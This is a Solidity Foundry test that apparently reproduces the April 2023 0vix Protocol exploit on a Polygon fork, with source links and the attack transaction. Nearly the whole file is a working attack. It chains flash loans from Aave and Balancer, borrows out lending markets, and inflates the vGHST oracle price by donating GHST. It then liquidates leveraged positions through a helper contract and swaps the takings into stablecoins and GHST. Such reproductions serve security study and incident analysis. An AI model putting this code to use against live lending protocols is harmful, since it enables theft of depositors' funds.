// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {ICErc20Delegate, IERC20, IUnitroller, IAaveFlashloan, IBalancerVault, Uni_Pair_V2, Uni_Pair_V3} from "./../interface.sol";

// @KeyInfo
// Project: https://twitter.com/0vixProtocol
// Date: 2023-04-28
// Vulnerability : Price Manipulation
// Description: The root cause is due to the flawed price calculation of a deflation token.
// Total Lost : ~@2M US$
// Attack Tx :https://polygonscan.com/tx/0x10f2c28f5d6cd8d7b56210b4d5e0cece27e45a30808cd3d3443c05d4275bb008

// @Sources
// Twitter : https://twitter.com/BlockSecTeam/status/1651932529874853888
// Twitter : https://twitter.com/peckshield/status/1651923235603361793
// Twitter : https://twitter.com/Mudit__Gupta/status/1651958883634536448

interface IVGHST is IERC20 {
    function enter(uint256 _amount) external returns (uint256);
    function leave(uint256 _amount) external;
    function convertVGHST(uint256 _share) external view returns (uint256 _ghst);
}

interface IDMMLP {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata callbackData) external;
}

interface IAlgebraPool {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(
        address recipient,
        bool zeroToOne,
        int256 amountSpecified,
        uint160 limitSqrtPrice,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface ISwapFlashLoan {
    function swap(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);
}

contract ContractTest is Test {
    IERC20 GHST = IERC20(0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 DAI = IERC20(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063);
    IERC20 WBTC = IERC20(0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IERC20 miMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
    IERC20 MATICX = IERC20(0xfa68FB4628DFF1028CFEc22b4162FCcd0d45efb6);
    IERC20 stMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
    IERC20 gDAI = IERC20(0x91993f2101cc758D0dEB7279d41e880F7dEFe827);
    IERC20 wstETH = IERC20(0x03b54A6e9a984069379fae1a4fC4dBAE93B3bCCD);
    IVGHST vGHST = IVGHST(0x51195e21BDaE8722B29919db56d95Ef51FaecA6C);
    ICErc20Delegate oUSDT = ICErc20Delegate(0x1372c34acC14F1E8644C72Dad82E3a21C211729f);
    ICErc20Delegate oMATIC = ICErc20Delegate(0xE554E874c9c60E45F1Debd479389C76230ae25A8);
    ICErc20Delegate oWBTC = ICErc20Delegate(0x3B9128Ddd834cE06A60B0eC31CCfB11582d8ee18);
    ICErc20Delegate oDAI = ICErc20Delegate(0x2175110F2936bf630a278660E9B6E4EFa358490A);
    ICErc20Delegate oWETH = ICErc20Delegate(0xb2D9646A1394bf784E376612136B3686e74A325F);
    ICErc20Delegate oUSDC = ICErc20Delegate(0xEBb865Bf286e6eA8aBf5ac97e1b56A76530F3fBe);
    ICErc20Delegate oMATICX = ICErc20Delegate(0xAAcc5108419Ae55Bc3588E759E28016d06ce5F40);
    ICErc20Delegate ostMATIC = ICErc20Delegate(0xDc3C5E5c01817872599e5915999c0dE70722D07f);
    ICErc20Delegate owstWETH = ICErc20Delegate(0xf06edA703C62b9889C75DccDe927b93bde1Ae654);
    ICErc20Delegate ovGHST = ICErc20Delegate(0xE053A4014b50666ED388ab8CbB18D5834de0aB12);
    IUnitroller unitroller = IUnitroller(0x8849f1a0cB6b5D6076aB150546EddEe193754F1C);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAlgebraPool AlgebraPool1 = IAlgebraPool(0x80DeeCE4befd9F27D2df88064cf75f080d3ce1b2);
    IAlgebraPool AlgebraPool2 = IAlgebraPool(0x55CAaBB0d2b704FD0eF8192A7E35D8837e678207);
    IAlgebraPool AlgebraPool3 = IAlgebraPool(0xe3703608393727C6B3761471d13e064c77c8d836);
    Uni_Pair_V2 SLP = Uni_Pair_V2(0xf69e93771F11AECd8E554aA165C3Fe7fd811530c);
    Uni_Pair_V2 UniV2Pair = Uni_Pair_V2(0xcCB9d2100037f1253e6C1682AdF7dC9944498AFF);
    Uni_Pair_V2 AavegotchiPoolPair = Uni_Pair_V2(0x096C5CCb33cFc5732Bcd1f3195C13dBeFC4c82f4);
    Uni_Pair_V3 UniV3Pair1 = Uni_Pair_V3(0xA374094527e1673A86dE625aa59517c5dE346d32);
    Uni_Pair_V3 UniV3Pair2 = Uni_Pair_V3(0x50eaEDB835021E4A108B7290636d62E9765cc6d7);
    Uni_Pair_V3 UniV3Pair3 = Uni_Pair_V3(0x8f16A8E864162ec84a2906646E08a561b5A7f72d);
    Uni_Pair_V3 UniV3Pair4 = Uni_Pair_V3(0x45dDa9cb7c25131DF268515131f647d726f50608);
    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x85fCD7Dd0a1e1A9FCD5FD886ED522dE8221C3EE5);
    IDMMLP DMMLP = IDMMLP(0xAb08b0C9DADC343d3795dAE5973925c3b6e39977);

    Exploiter exploiter;

    // CheatCodes vm = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        vm.createSelectFork("polygon", 42_054_768);
        vm.label(address(GHST), "GHST");
        vm.label(address(USDC), "USDC");
        vm.label(address(USDT), "USDT");
        vm.label(address(WMATIC), "WMATIC");
        vm.label(address(DAI), "DAI");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(WETH), "WETH");
        vm.label(address(miMATIC), "miMATIC");
        vm.label(address(WMATIC), "WMATIC");
        vm.label(address(stMATIC), "stMATIC");
        vm.label(address(gDAI), "gDAI");
        vm.label(address(wstETH), "wstETH");
        vm.label(address(MATICX), "MATICX");
        vm.label(address(vGHST), "vGHST");
        vm.label(address(oMATIC), "oMATIC");
        vm.label(address(oWBTC), "oWBTC");
        vm.label(address(oDAI), "oDAI");
        vm.label(address(oWETH), "oWETH");
        vm.label(address(oUSDC), "oUSDC");
        vm.label(address(oMATICX), "oMATICX");
        vm.label(address(owstWETH), "owstWETH");
        vm.label(address(ovGHST), "ovGHST");
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(aaveV2), "aaveV2");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(AlgebraPool1), "AlgebraPool1");
        vm.label(address(AlgebraPool2), "AlgebraPool2");
        vm.label(address(AlgebraPool3), "AlgebraPool3");
        vm.label(address(SLP), "SLP");
        vm.label(address(UniV2Pair), "UniV2Pair");
        vm.label(address(AavegotchiPoolPair), "AavegotchiPoolPair");
        vm.label(address(UniV3Pair1), "UniV3Pair1");
        vm.label(address(UniV3Pair2), "UniV3Pair2");
        vm.label(address(UniV3Pair3), "UniV3Pair3");
        vm.label(address(UniV3Pair4), "UniV3Pair4");
        vm.label(address(DMMLP), "DMMLP");
        vm.label(address(swapFlashLoan), "swapFlashLoan");
        vm.label(address(unitroller), "unitroller");
    }

    function testExploit() external {
        deal(address(this), 0);
        exploiter = new Exploiter();
        vGHST.approve(address(ovGHST), type(uint256).max);
        GHST.approve(address(vGHST), type(uint256).max);
        USDT.approve(address(oUSDT), type(uint256).max);
        aaveV3Flashloan();

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),
            USDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker GHST balance after exploit",
            GHST.balanceOf(address(this)),
            GHST.decimals()
        );
    }
    // aaveV3, aaveV2 FlashLoan callback

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        if (msg.sender == address(aaveV3)) {
            GHST.approve(msg.sender, type(uint256).max);
            USDC.approve(msg.sender, type(uint256).max);
            USDT.approve(msg.sender, type(uint256).max);
            aaveV2Flashloan();
            return true;
        } else {
            USDC.approve(msg.sender, type(uint256).max);
            USDT.approve(msg.sender, type(uint256).max);
            balancerFlashloan();
            console.log("6. swap asset to USD and GHST");
            swapTokenToUSDAndGHST();
            return true;
        }
    }

    // balancer FlashLoan callback
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        console.log("1. deposit USDT collateral");
        vGHST.enter(294_000 * 1e18);
        oUSDT.mint(USDT.balanceOf(address(this))); // deposit USDT collateral

        console.log("2. borrow asset");
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(oUSDT);
        unitroller.enterMarkets(cTokens);
        borrowAll(); // borrow asset

        console.log("3. Build leveraged debt positions by USDC collateral");
        USDC.transfer(address(exploiter), 24_500_000 * 1e6);
        vGHST.transfer(address(exploiter), vGHST.balanceOf(address(this)));
        exploiter.mint(24, address(this)); // Build leveraged debt positions by USDC collateral

        console.log("4. VGHSTOracle price manipulation");
        console.log("the price of vGHST before donate:\t", vGHST.convertVGHST(1e18));
        GHST.transfer(address(vGHST), 1_656_000 * 1e18); // VGHSTOracle price manipulation
        console.log("the price of vGHST after donate:\t", vGHST.convertVGHST(1e18));

        console.log("5. liquidate Leveraged Debt and Get back USDC collateral");
        liquidateLeveragedDebt(); // liquidate Leveraged Debt
        oUSDC.redeem(oUSDC.balanceOf(address(this))); // Get back USDC collateral
        oUSDC.redeemUnderlying(USDC.balanceOf(address(oUSDC))); // ?
        vGHST.leave(vGHST.balanceOf(address(this)));

        USDC.transfer(address(Balancer), amounts[0]);
        USDT.transfer(address(Balancer), amounts[1]);
    }

    function borrowAll() internal {
        oMATIC.borrow(address(oMATIC).balance);
        oWBTC.borrow(WBTC.balanceOf(address(oWBTC)));
        oDAI.borrow(DAI.balanceOf(address(oDAI)));
        oWETH.borrow(WETH.balanceOf(address(oWETH)));
        oUSDC.borrow(USDC.balanceOf(address(oUSDC)));
        oUSDT.borrow(1_160_000 * 1e6);
        oMATICX.borrow(MATICX.balanceOf(address(oMATICX)));
        ostMATIC.borrow(120_000 * 1e18);
        owstWETH.borrow(wstETH.balanceOf(address(owstWETH)));
    }

    function liquidateLeveragedDebt() internal {
        uint256 liquidateAmount = vGHST.balanceOf(address(this));
        for (uint256 i; i < 23; i++) {
            ovGHST.liquidateBorrow(address(exploiter), liquidateAmount, address(oUSDC));
            ovGHST.redeemUnderlying(liquidateAmount);
        }
        ovGHST.liquidateBorrow(address(exploiter), 336_548_170_226_199_618_982_307, address(oUSDC));
        ovGHST.redeemUnderlying(336_548_170_226_199_618_982_307);
    }

    function swapTokenToUSDAndGHST() internal {
        wstETHToWETH();
        stMATICToWMATIC();
        MATICXToWMATIC();
        WMATICToGHST();
        WMATICToUSDC();
        WBTCToWETH();
        WETHToGHST();
        WETHToUSDC();
        DAIToUSDT();
        USDCToGHST();
    }

    function wstETHToWETH() internal {
        wstETH.transfer(address(DMMLP), wstETH.balanceOf(address(this)));
        DMMLP.swap(0, 314 * 1e18, address(this), new bytes(0));
    }

    function stMATICToWMATIC() internal {
        stMATIC.approve(address(Balancer), type(uint256).max);
        IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
            poolId: 0x8159462d255c1d24915cb51ec361f700174cd99400000000000000000000075d,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: address(stMATIC),
            assetOut: address(WMATIC),
            amount: stMATIC.balanceOf(address(this)),
            userData: new bytes(0)
        });
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });
        Balancer.swap(singleSwap, funds, 0, block.timestamp);
    }

    function MATICXToWMATIC() internal {
        MATICX.approve(address(Balancer), type(uint256).max);
        IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
            poolId: 0xb20fc01d21a50d2c734c4a1262b4404d41fa7bf000000000000000000000075c,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: address(MATICX),
            assetOut: address(WMATIC),
            amount: MATICX.balanceOf(address(this)),
            userData: new bytes(0)
        });
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });
        Balancer.swap(singleSwap, funds, 0, block.timestamp);
    }

    function WMATICToGHST() internal {
        address(WMATIC).call{value: address(this).balance}("");
        AlgebraPool1.swap(address(this), true, 314_000 * 1e18, 4_495_990_861_938_833_545_658_574_552, new bytes(0));
        WMATIC.transfer(address(SLP), 100_000 * 1e18);
        SLP.swap(0, 44_000 * 1e18, address(this), new bytes(0));
    }

    function WMATICToUSDC() internal {
        UniV3Pair1.swap(
            address(this),
            true,
            int256(WMATIC.balanceOf(address(this))),
            70_888_624_962_869_287_903_104,
            new bytes(0)
        );
    }

    function WBTCToWETH() internal {
        UniV3Pair2.swap(
            address(this),
            true,
            int256(WBTC.balanceOf(address(this))),
            25_729_321_748_246_614_730_688_896_004_128_086,
            new bytes(0)
        );
    }

    function WETHToGHST() internal {
        WETH.transfer(address(UniV2Pair), 50 * 1e18);
        UniV2Pair.swap(47_600 * 1e18, 0, address(this), new bytes(0));
        UniV3Pair3.swap(address(this), false, 65 * 1e18, 193_488_308_442_001_139_268_702_034_900, new bytes(0));
    }

    function WETHToUSDC() internal {
        UniV3Pair4.swap(address(this), false, 530 * 1e18, 1_998_382_131_994_531_085_392_415_970_245_451, new bytes(0));
        AlgebraPool2.swap(
            address(this),
            false,
            int256(WETH.balanceOf(address(this))),
            1_998_382_131_994_531_085_392_415_970_245_451,
            new bytes(0)
        );
    }

    function DAIToUSDT() internal {
        DAI.approve(address(swapFlashLoan), type(uint256).max);
        swapFlashLoan.swap(1, 3, DAI.balanceOf(address(this)), 150_000 * 1e6, block.timestamp);
    }

    function USDCToGHST() internal {
        USDC.approve(address(Balancer), type(uint256).max);
        IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
            poolId: 0xae8f935830f6b418804836eacb0243447b6d977c000200000000000000000ad1,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: address(USDC),
            assetOut: address(GHST),
            amount: 220_000 * 1e6,
            userData: new bytes(0)
        });
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });
        Balancer.swap(singleSwap, funds, 0, block.timestamp);
        AlgebraPool3.swap(
            address(this),
            true,
            900_000 * 1e6,
            565_521_259_495_684_628_339_632_353_478_984,
            new bytes(0)
        );
        USDC.transfer(address(AavegotchiPoolPair), 310_000 * 1e6);
        AavegotchiPoolPair.swap(0, 158_000 * 1e18, address(this), new bytes(0));
    }

    function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (amount0Delta > 0) {
            IERC20(IAlgebraPool(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20(IAlgebraPool(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (amount0Delta > 0) {
            IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    function aaveV3Flashloan() internal {
        address[] memory assets = new address[](3);
        assets[0] = address(GHST);
        assets[1] = address(USDC);
        assets[2] = address(USDT);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1_950_000 * 1e18;
        amounts[1] = 6_800_000 * 1e6;
        amounts[2] = 2_300_000 * 1e6;
        uint256[] memory modes = new uint[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function aaveV2Flashloan() internal {
        address[] memory assets = new address[](2);
        assets[0] = address(USDC);
        assets[1] = address(USDT);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 13_000_000 * 1e6;
        amounts[1] = 3_250_000 * 1e6;
        uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function balancerFlashloan() internal {
        address[] memory tokens = new address[](2);
        tokens[0] = address(USDC);
        tokens[1] = address(USDT);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 4_700_000 * 1e6;
        amounts[1] = 600_000 * 1e6;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    receive() external payable {}
}

contract Exploiter {
    IERC20 GHST = IERC20(0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    ICErc20Delegate oUSDT = ICErc20Delegate(0x1372c34acC14F1E8644C72Dad82E3a21C211729f);
    ICErc20Delegate oUSDC = ICErc20Delegate(0xEBb865Bf286e6eA8aBf5ac97e1b56A76530F3fBe);
    IVGHST vGHST = IVGHST(0x51195e21BDaE8722B29919db56d95Ef51FaecA6C);
    ICErc20Delegate ovGHST = ICErc20Delegate(0xE053A4014b50666ED388ab8CbB18D5834de0aB12);
    IUnitroller unitroller = IUnitroller(0x8849f1a0cB6b5D6076aB150546EddEe193754F1C);

    constructor() {
        USDC.approve(address(oUSDC), type(uint256).max);
        vGHST.approve(address(ovGHST), type(uint256).max);
    }

    function mint(uint256 amountOfOptions, address owner) external {
        oUSDC.mint(USDC.balanceOf(address(this)));
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(oUSDC);
        unitroller.enterMarkets(cTokens);
        ovGHST.borrow(vGHST.balanceOf(address(ovGHST)));
        uint256 vGHSTAmount = vGHST.balanceOf(address(this));
        console.log("vGHST", vGHST.balanceOf(address(this)));
        for (uint256 i; i < amountOfOptions; i++) {
            ovGHST.mint(vGHSTAmount);
            ovGHST.borrow(vGHSTAmount);
        }
        vGHST.transfer(owner, vGHSTAmount);
        ovGHST.transfer(owner, ovGHST.balanceOf(address(this)));
        oUSDT.borrow(USDT.balanceOf(address(oUSDT)));
        oUSDC.borrow(720_000 * 1e6);
        USDT.transfer(owner, USDT.balanceOf(address(this)));
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }
}
